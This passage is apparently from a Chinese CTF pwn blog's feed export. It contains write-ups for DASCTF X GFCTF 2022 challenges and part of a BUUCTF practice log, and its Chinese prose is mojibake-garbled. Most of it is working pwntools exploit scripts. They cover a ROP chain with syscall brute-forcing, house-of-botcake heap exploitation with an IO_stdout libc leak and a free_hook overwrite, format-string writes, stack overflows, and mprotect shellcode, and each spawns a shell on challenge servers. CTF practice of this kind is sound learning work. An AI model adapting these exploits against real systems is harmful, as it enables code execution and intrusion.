class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib64/ld-linux-x86-64.so.2&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    <span class="hljs-comment">#r = process(local_file)</span><br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = elf.arch</span><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    bss_start=<span class="hljs-number">0x404018</span><br><br>    ret=<span class="hljs-number">0x40101a</span><br>    rax=<span class="hljs-number">0x40116d</span><br>    rsi_call_read=<span class="hljs-number">0x401141</span><br>    rdi=<span class="hljs-number">0x401099</span><br>    read_rax=<span class="hljs-number">0x40115a</span><br>    <br>    se(p32(<span class="hljs-number">0x100</span>))<br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss_start)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(read_rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(read_got)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(read_rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss_start+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(ret)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(rdi)<br>    payload+=p64(rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x3b</span>)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(rsi_call_read)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>    se(payload)<br>    se(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>    se(<span class="hljs-string">b&#x27;\x3b\x1a\xea&#x27;</span>)<br>    r.recv(timeout = <span class="hljs-number">1</span>)<br>    r.interactive()<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;have try:&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br>        i+=<span class="hljs-number">1</span><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>æœ€åè¦æ”¹read_gotä¸ºsyscall+0x1b æˆ‘æœ¬åœ°æœ‰ä¸‰ä¸ªä½è¦çˆ†ç ´ï¼Œ1/4096æˆåŠŸï¼Œ</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/baopo.png" alt="baopo"></p><p>ä¸è¿‡è¿™é¢˜è¿œç«¯åªè¦çˆ†ç ´ä¸€ä½1/16ï¼Œæˆ‘çœŸçš„æ˜¯åƒé¥±äº†æ’‘çš„</p><h2 id="magic-book">magic_book</h2><h3 id="0x01ç¨‹åºåˆ†æ">0x01ç¨‹åºåˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%983%E4%BF%9D%E6%8A%A4.png" alt="é¢˜3ä¿æŠ¤"></p><p>æœ‰addå’ŒdeleteåŠŸèƒ½</p><p>é€‰æ‹©9çš„è¯è¿˜æœ‰åªèƒ½ä½¿ç”¨1æ¬¡çš„uaf</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/uaf.png" alt="uaf"></p><p>æ²¡æœ‰showåŠŸèƒ½ï¼Œè¦æ³„éœ²libcå°±è¦æ‰“IO_stdout</p><p>ç”¨çš„libcæ˜¯2.31çš„ï¼Œè¿˜èƒ½ç”¨hook</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/libc2.31%E9%A2%983.png" alt="libc2.31é¢˜3"></p><h3 id="0x02åˆ©ç”¨æ€è·¯">0x02åˆ©ç”¨æ€è·¯</h3><p>1.ä½¿ç”¨house of botcake çš„æ‰‹æ³•ï¼Œåœ¨ä»…ä½¿ç”¨ä¸€æ¬¡uafçš„æƒ…å†µä¸‹ï¼Œé¿å…äº†tcacheçš„keyå€¼æ£€æµ‹ï¼Œé€ æˆtcache poioningçš„æ•ˆæœ</p><p>ï¼ˆvictimå †åœ¨åŒä¸€ä¸ªåœ°å€ï¼Œä¸€ä¸ªåœ¨tcachebinï¼Œä¸€ä¸ªåœ¨unsortbinï¼‰</p><p>2.åˆ‡å‰²unsortbinï¼Œä¿®æ”¹unsortbinä¸­å­˜çš„main_arena+96åœ°å€ä¸ºstdoutï¼ˆæœ€å12ä½åç§»ä¸å˜ï¼Œç¬¬12~16ä½è¦çˆ†ç ´4ä½ï¼ŒåŠä¸ªå­—èŠ‚1/16ï¼‰</p><p>æ”¹unsorbinä¸­victimçš„fdæŒ‡å‘å­˜æœ‰stdoutçš„å †çš„åœ°å€ï¼ˆå †åœ°å€ä¹Ÿæ˜¯ä¸€æ ·ï¼Œç¬¬å››ä½è¦çˆ†ç ´1/16ï¼‰ï¼Œé€ æˆtcache poioningæŒ‡å‘stdout</p><p>3.åˆ†é…å †åˆ°stdoutï¼Œç„¶åè¿™ä¹ˆå¡«<code>flat(0xfbad1800,0,0,0,b'\x00')</code>å°±èƒ½é putsæ³„éœ²å‡ºlibcäº†</p><p>4.å¤ç”¨house of botcake ï¼Œå¾€free_hooké‡Œå†™system,é‡Šæ”¾å¸¦æœ‰/bin/shçš„chunk</p><p>æ‰€ä»¥æˆåŠŸç‡1/256</p><p><strong>expï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/pwn/libc&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/pwn/ld&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uaf</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------house_of_botcake--------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#0~6</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#7</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#8</span><br>    add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#9</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete(i)<br>    uaf(<span class="hljs-number">8</span>)<br>    delete(<span class="hljs-number">7</span>)<br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;padding&#x27;</span>)<span class="hljs-comment">#10</span><br>    delete(<span class="hljs-number">8</span>)<br>    <span class="hljs-comment">#------_IO_stdout leak------------------</span><br>    add(<span class="hljs-number">0x50</span>,p16(<span class="hljs-number">0x26a0</span>))<span class="hljs-comment">#11</span><br>    add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p16(<span class="hljs-number">0xb690</span>))<span class="hljs-comment">#12</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<span class="hljs-comment">#13</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<span class="hljs-comment">#14</span><br>    add(<span class="hljs-number">0x80</span>,flat(<span class="hljs-number">0xfbad1800</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<span class="hljs-comment">#15</span><br>    stdin=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>    libc_base=uu64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>,timeout=<span class="hljs-number">0.1</span>)[-<span class="hljs-number">6</span>:])-stdin<br><br>    <span class="hljs-keyword">if</span> libc_base == -stdin:<br>        exit(-<span class="hljs-number">1</span>)<br><br>    info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>    system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    <span class="hljs-comment">#-------re botcake------------------------------</span><br>    delete(<span class="hljs-number">13</span>)<br>    delete(<span class="hljs-number">12</span>)<br>    add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(free_hook))<span class="hljs-comment">#16</span><br>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<span class="hljs-comment">#17</span><br>    add(<span class="hljs-number">0x80</span>,p64(system))<span class="hljs-comment">#18</span><br>    delete(<span class="hljs-number">17</span>)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#r=process(&#x27;./pwn&#x27;)</span><br>        r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29922</span>)<br>        <span class="hljs-keyword">try</span>:<br>            pwn()<br>            r.interactive()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br><br></code></pre></td></tr></table></figure><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%983shell.png" alt="é¢˜3shell"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
      <tag>IO_leak</tag>
      
      <tag>shellocde</tag>
      
      <tag>house of botcake</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUåˆ·é¢˜</title>
    <link href="/2020/11/24/buu%E5%88%B7%E9%A2%98/"/>
    <url>/2020/11/24/buu%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>å› ä¸ºçœŸçš„èŠ±äº†å¤§æŠŠæ—¶é—´å»åˆ·é¢˜ï¼Œæ„Ÿè°¢carolå¸ˆå‚…çš„è´´å¿ƒæŒ‡å¯¼ï¼Œå¥½åœ¨è¿‡å»è®°å½•äº†,ä¸€äº›è¯éƒ½æ˜¯ä»¥å‰å†™çš„ï¼Œæ”¾è¿›æ¥ï¼Œæœªæ¥ä¸ä¼šå†åˆ·äº†ï¼Œå› ä¸ºé¢˜ç›®è¿‡æ—¶äº†ï¼Œè¿˜æœ‰å·glibcä¹Ÿæ²¡ä»€ä¹ˆç”¨ï¼Œæ—©çŸ¥é“è¿™ç‚¹è¯¥å¤šå¥½(æ‚²</p><p>è¿˜æœ‰ä¸€äº›ä¸å…¨çš„å°±ä¸æ”¾äº†ï¼Œä¹Ÿå¯èƒ½æœ‰é‡å¤ï¼Œä¸è¿‡çœŸçš„æœ‰äººä¼šçœ‹å—ğŸ¤¤</p><p>è¦æ‰¾é¢˜ç›®å»ºè®®ï¼Œæµè§ˆå™¨CTRL+Fï¼Œæœç´¢é¢˜ç›®</p><h2 id="å¤§ä¸€ä¸Š">å¤§ä¸€ä¸Š</h2><h3 id="ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5">[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5</h3><p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å’Œ%nèƒ½æ”¹æŸåœ°å€æ”¹å†™æ•°æ®</p><p>æœ¬é¢˜è¦æ”¹å†™çš„åœ°å€ä¸Šçš„æ•°æ®åœ¨.bssæ®µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25657</span>)<br><br><span class="hljs-comment">#å…ˆè·‘éç¨‹åºæ‰¾ä¸‹åç§»ï¼Œä¾‹å¦‚é€ï¼šaaaa,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</span><br><span class="hljs-comment">#æ‰¾å‡ºformatsåœ¨æ ˆä¸­çš„åç§»</span><br>offest=<span class="hljs-number">10</span><br>dizhi=<span class="hljs-number">0x0804C044</span><br>r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,p32(dizhi)+<span class="hljs-string">&#x27;%10$n&#x27;</span>)<br><span class="hljs-comment">#åœ°å€åœ¨å‰ï¼Œåç§»æŒ‡å®šä½æ•°ï¼Œå¡«aä»€ä¹ˆçš„æ”¹ä½ è¦çš„å€¼ï¼ˆå¥½åƒåªèƒ½å¤§äºç­‰äº4ï¼‰</span><br>r.sendlineafter(<span class="hljs-string">&#x27;passwd&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-r2t3">[BJDCTF 2nd]r2t3</h3><p>#æœ¬é¢˜strlen,strcpyéƒ½ç”¨\x00æ£€æµ‹æœ«å°¾ï¼Œä¸èƒ½ç”¨\x00ç»•è¿‡</p><p>#32ä½ç¨‹åºè€ƒè™‘æ•´æ•°æº¢å‡ºç»•è¿‡ï¼Œè€Œä¸”é¢˜ç›®ç»™äº†é‚£ä¹ˆå¤šç©ºé—´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29897</span>)<br>shell=<span class="hljs-number">0x0804858b</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x11</span>)+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(shell)+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">260</span>-<span class="hljs-number">0x11</span>-<span class="hljs-number">8</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-en-2">ciscn_2019_en_2</h3><p>é¢˜ç›®è·Ÿciscn_2019_c_1é‡å¤äº†23333</p><h3 id="get-started-3dsctf-2016">get_started_3dsctf_2016</h3><p>è¿™é“é¢˜æ˜¯æ ˆæº¢å‡ºåˆ°æŒ‡å®šå‡½æ•°ã€‚ä½†è¦æ³¨æ„ç¨‹åºä¸­æœ‰çš„æ˜¯ç±»ä¼¼cat flagï¼Œä¸æ˜¯å¼€shellï¼Œç›´æ¥æº¢å‡ºç»•è¿‡ifæ¡ä»¶çš„è¯ï¼Œç¨‹åºé”™è¯¯é€€å‡ºflagä¸ä¼šæ˜¾ç¤º</p><p>æ ¹æ®ifæ¡ä»¶ï¼Œæ‘†å¯¹ä¸¤ä¸ªå‚æ•°ï¼Œå‡½æ•°è¿”å›å€¼è·³åˆ°exitæ­£å¸¸é€€å‡ºå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27426</span>)<br>catflag=<span class="hljs-number">0x080489a0</span><br>elf=ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>main=<span class="hljs-number">0x08048A20</span><br>exit=<span class="hljs-number">0x804e6a0</span><br>ret=<span class="hljs-number">0x08048196</span> <br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p32(ret)+p32(catflag)+p32(exit)+p32(<span class="hljs-number">0x308CD64F</span>)+p32(<span class="hljs-number">0x195719D1</span>)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>è¿™ç¨‹åºé™æ€é“¾æ¥ï¼Œå¦ä¸€ç§è§£æ³•æ˜¯åˆ©ç”¨mprotectå‡½æ•°ï¼Œé€šè¿‡ç»™bssæ®µèµ‹å¯æ‰§è¡Œæƒé™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29970</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>mprotect = <span class="hljs-number">0x0806EC80</span><br>bss=<span class="hljs-number">0x080eb000</span><br>pop_ebx_esi_edi_ret=<span class="hljs-number">0x080509a5</span> <span class="hljs-comment"># pop ebx ; pop esi ; pop edi ; ret</span><br><br><span class="hljs-comment">#è¿™é‡Œebx==rdxå¥½åƒ</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p32(elf.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>])+p32(pop_ebx_esi_edi_ret)+p32(bss)+p32(<span class="hljs-number">0x2d</span>)+p32(<span class="hljs-number">7</span>)<br>payload+=p32(elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>])+p32(bss)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x2c</span>)<br><span class="hljs-comment">#è¿™é‡Œæ˜¯å…ˆç»™bssæ®µå¼€å¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç„¶åè°ƒç”¨ä¸ªè¾“å…¥å‡½æ•°ï¼Œå†é€ä¸ªshellcraftè¿›å»</span><br>r.sendline(payload)<br>pd=asm(shellcraft.sh())<br>r.sendline(pd)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-8">ciscn_2019_n_8</h3><p>è¿™é¢˜è¾“å…¥å€¼æŠŠvar[13]å˜æˆ17</p><p>æä¸æ¸…æ¥šä»€ä¹ˆæ—¶å€™ç”¨p32æ‰“åŒ…æ•°å­—ï¼Œä»€ä¹ˆæ—¶å€™ç›´æ¥str(æ•°å­—)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29729</span>)<br>r.sendline(<span class="hljs-string">&#x27;aaaa&#x27;</span>*<span class="hljs-number">13</span>+p32(<span class="hljs-number">17</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="jarvisoj-level2ï¼š">jarvisoj_level2ï¼š</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26947</span>)<br>system=<span class="hljs-number">0x8048320</span><br>binsh=<span class="hljs-number">0x804a024</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="not-the-same-3dsctf-2016">not_the_same_3dsctf_2016</h3><p>ç¨‹åºæœ‰cat flagçš„å€¼åˆ°.bssæ®µï¼Œè·³è‡³æŒ‡å®šå‡½æ•°ï¼Œè¿”å›æ—¶ç”¨è¾“å‡ºå‡½æ•°æ‰“å°flagï¼Œåå›åœ°å€å¡«exitå‡½æ•°ï¼Œæ­£å¸¸é€€å‡ºä¾¿ä¼šæ˜¾ç¤ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28327</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)<br>flag=<span class="hljs-number">0x080ECA2D</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2d</span>+p32(elf.sym[<span class="hljs-string">&#x27;get_secret&#x27;</span>])<br><br>payload+=p32(elf.sym[<span class="hljs-string">&#x27;printf&#x27;</span>])+p32(elf.sym[<span 